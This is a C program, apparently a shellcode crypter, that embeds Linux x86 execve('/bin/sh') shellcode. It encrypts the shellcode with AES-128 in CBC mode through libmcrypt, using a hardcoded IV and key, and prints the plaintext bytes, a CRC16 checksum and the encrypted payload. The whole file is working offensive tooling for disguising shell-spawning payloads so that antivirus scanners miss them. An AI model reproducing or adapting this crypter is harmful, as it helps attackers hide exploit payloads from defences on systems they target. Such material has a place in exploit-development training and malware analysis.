#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcrypt.h>
#include <math.h>
#include <stdint.h>
#include <stdlib.h>

char shellcode[] = \
"\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int encrypt(
    void* buffer,
    int buffer_len, /* Because the plaintext could include null bytes*/
    char* IV, 
    char* key,
    int key_len 
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}

  mcrypt_generic_init(td, key, key_len, IV);
  mcrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);
  
  return 0;
}

void display(char* ciphertext, int len){
  int v;
  for (v=0; v<len; v++){
    printf("\\x%02x", 0xFF&ciphertext[v]);
  }
  printf("\n");
}

unsigned short crc16(unsigned char* data_p, unsigned char length){
    unsigned char x;
    unsigned short crc = 0xFFFF;

    while (length--){
        x = crc >> 8 ^ *data_p++;
        x ^= x>>4;
        crc = (crc << 8) ^ ((unsigned short)(x << 12)) ^ ((unsigned short)(x <<5)) ^ ((unsigned short)x);
    }
    return crc;
}

int main(int argc, char *argv[])
{
  MCRYPT td, td2;
  char* IV = "AAAAAAAAAAAAAAAA";
  char *key = "13372015";
  int keysize = 8; /* 64 bits */
  char* buffer;
  int buffer_len = 32;

  buffer = calloc(1, buffer_len);
  strncpy(buffer, shellcode, buffer_len);

  printf("plain    :  "); display(buffer, buffer_len);
  printf("checksum :  0x%04x\n", crc16(buffer, buffer_len));
  encrypt(buffer, buffer_len, IV, key, keysize); 
  printf("cipher   :  "); display(buffer, buffer_len);
  
  return 0;
}
